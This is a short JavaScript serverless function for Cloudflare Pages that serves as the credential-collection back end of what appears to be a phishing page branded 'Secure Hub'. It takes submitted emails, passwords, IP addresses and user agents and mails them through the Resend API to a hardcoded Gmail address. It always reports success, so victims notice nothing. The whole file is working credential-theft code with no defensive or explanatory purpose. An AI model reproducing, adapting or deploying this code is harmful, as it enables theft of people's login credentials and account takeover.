// functions/api/collect.js - Cloudflare Pages
export async function onRequestPost(context) {
  try {
    const { request, env } = context;
    const body = await request.json();
    const { email, password, ip, userAgent } = body;

    const apiKey = env.RESEND_API_KEY1;
    if (!apiKey) {
      console.error('RESEND_API_KEY is not set');
      return new Response(JSON.stringify({ success: true }), { status: 200 });
    }

    const emailBody = `
🔐 New Credentials
📧 Email: ${email || 'N/A'}
🔑 Password: ${password || 'N/A'}
🌐 IP: ${ip || 'Unknown'}
📱 User-Agent: ${userAgent || 'N/A'}
⏰ Time: ${new Date().toISOString()}
    `;

    await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${apiKey}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        from: 'onboarding@resend.dev',
        to: ['g82443047@gmail.com'], 
        subject: 'New Login - Secure Hub',
        text: emailBody.trim(),
        html: `<pre>${emailBody.trim()}</pre>`,
      }),
    });

    return new Response(JSON.stringify({ success: true }), { status: 200 });
  } catch (error) {
    console.error('Error in collect handler:', error);
    return new Response(JSON.stringify({ success: true }), { status: 200 });
  }
}